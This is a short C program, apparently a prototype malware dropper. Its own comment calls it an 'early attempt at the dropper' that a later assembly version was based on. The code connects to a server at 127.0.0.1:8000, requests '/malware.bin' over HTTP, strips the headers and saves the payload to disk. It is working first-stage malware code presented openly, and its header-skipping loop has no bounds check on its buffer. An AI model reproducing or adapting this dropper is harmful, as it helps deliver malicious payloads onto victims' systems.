#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/*
Early attempt at the dropper, dropper.S was written based of off this
*/

int main(void) {
    int sockfd, b;
    char *send_data = "GET /malware.bin HTTP/1.1\r\n\r\n";
    char recv_data[1024];
    struct sockaddr_in server_addr;
    char buff[1024]="",*ptr=buff+4;

    // Create socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { return 1; }

    // Assign IP and PORT
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &(server_addr.sin_addr));
    server_addr.sin_port = htons(8000);
    bzero(&(server_addr.sin_zero), 8);

    // Connect to socket
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) < 0) { return 1; }

    // Send get packet to request the malware to be sent over
    if (send(sockfd, send_data, strlen(send_data), 0) < 0) { return 1; }

    // Skip http packet header since we only require the data
    while ((recv(sockfd, ptr, 1, 0)) > 0) {
        if((ptr[-3]=='\r')  && (ptr[-2]=='\n' ) && (ptr[-1]=='\r')  && (*ptr=='\n' )) { break; }
        ptr++;
    }

    // Retrieve the actual file and save it to "malware.bin"
    FILE* fd = fopen("malware.bin", "wb");
    while ((b = recv(sockfd, recv_data, 1024, 0))) {
        fwrite(recv_data, 1, b, fd);
    }

    // Close files
    fclose(fd);
    close(sockfd);

    return 0;
}